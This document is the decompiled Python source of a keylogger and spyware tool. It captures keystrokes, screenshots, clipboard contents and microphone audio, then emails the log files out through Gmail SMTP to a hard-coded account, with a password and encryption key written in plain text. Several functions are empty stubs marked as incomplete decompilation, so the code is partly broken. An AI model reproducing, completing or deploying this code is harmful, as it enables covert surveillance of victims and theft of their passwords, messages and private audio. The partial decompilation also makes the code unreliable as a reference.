
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
keys_information = 'key_log.txt'
file_path = 'D:\\Cyber\\projects\\keylogger\\Project'
extend = '\\'
file_merge = file_path + extend
system_information = 'systeminfo.txt'
clipboard_information = 'clipboard.txt'
audio_information = 'audio.wav'
screenshot_information = 'screenshot.png'
e_keys_information = 'e_key_log.txt'
e_system_information = 'e_systeminfo.txt'
e_clipboard_information = 'e_clipboard.txt'
encryption_key = 'd82sX4d-y9G0bS7utB1-S3efbvQZO0JqWe6WT5KRnzs='
email_address = 'eladye666@deshr.edumschool.org'
password = 'elad1234'
to_addr = email_address
username = getpass.getuser()
count = 0
keys = []
microphone_time = 10
time_iteration = 15
number_of_iterations = 0
number_of_iterations_end = 3
current_time = time.time()
stopping_time = time.time() + time_iteration

def send_email(file_name, attachment, to_addr):
    msg = MIMEMultipart()
    msg['From'] = email_address
    msg['To'] = to_addr
    msg['Subject'] = 'Log file'
    body = 'Body_of_the_email'
    msg.attach(MIMEText(body, 'plain'))
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', 'attachment; filename= %s' % file_name)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(email_address, password)
    text = msg.as_string()
    s.sendmail(email_address, to_addr, text)
    s.quit()


def screenshot():
    img = ImageGrab.grab()
    img.save(file_path + extend + screenshot_information)


def computer_information():
    pass
# WARNING: Decompyle incomplete


def copy_clipboard():
    pass
# WARNING: Decompyle incomplete


def microphone():
    fs = 44100
    seconds = microphone_time
    rec = sd.rec(seconds * fs, fs, 2, **('samplerate', 'channels'))
    sd.wait()
    write(file_path + extend + audio_information, fs, rec)

# WARNING: Decompyle incomplete
